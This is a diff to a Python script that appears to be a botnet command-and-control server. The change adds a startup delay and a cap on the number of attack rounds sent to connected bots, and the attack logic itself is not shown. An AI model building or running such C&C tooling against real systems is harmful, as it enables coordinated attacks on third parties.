@@ -6,6 +6,7 @@ from secrets import token_bytes
 listen_port = 20001
 randomattackpayload = token_bytes(14)  
 attack_interval = 5
+total_send = 10
 
 bots = []
 
@@ -39,7 +40,13 @@ def attack():
     updateinterval()
 
 def runner():
+    print("waiting 1min before sending attacks");
+    time.sleep(60)
+    count = 0
     while True:
+        if count == total_send-1:
+            print("[cnc] total send reached")
+            break
         attack()
         print("[cnc] attacks sent")
         time.sleep(attack_interval)
